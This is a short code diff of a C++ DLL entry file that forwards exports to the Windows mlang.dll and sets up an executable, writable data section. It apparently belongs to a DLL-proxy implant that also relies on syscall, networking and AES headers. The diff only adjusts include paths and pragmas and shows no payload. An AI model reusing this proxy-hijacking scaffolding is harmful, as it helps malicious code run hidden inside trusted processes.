@@ -1,9 +1,9 @@
 // dllmain.cpp : Defines the entry point for the DLL application.
-#include "../Headers/procutils.h"
-#include "../Headers/syscalls.h"
-#include "../Headers/client.h"
-#include "../Headers/net_common.h"
-#include "../Headers/aes.hpp"
+#include "../../Headers/procutils.h"
+#include "../../Headers/syscalls.h"
+#include "../../Headers/client.h"
+#include "../../Headers/net_common.h"
+#include "../../Headers/aes.hpp"
 
 #pragma comment(linker, "/export:IsConvertINetStringAvailable=C:\\Windows\\System32\\mlang.IsConvertINetStringAvailable,@110")
 #pragma comment(linker, "/export:ConvertINetString=C:\\Windows\\System32\\mlang.ConvertINetString,@111")
@@ -18,11 +18,11 @@
 #pragma comment(linker, "/export:Rfc1766ToLcidA=C:\\Windows\\System32\\mlang.Rfc1766ToLcidA,@122")
 #pragma comment(linker, "/export:Rfc1766ToLcidW=C:\\Windows\\System32\\mlang.Rfc1766ToLcidW,@123")
 
-#pragma section(".didat",execute, read, write
+//#pragma section(".didat",execute, read, write)
 #pragma comment(linker, "/SECTION:.didat,ERW")
 
 #pragma data_seg(".didat")
-__declspec( allocate( ".didat" ) ) int _x = 0;
+int _x = 0;
 #pragma data_seg()
 
 
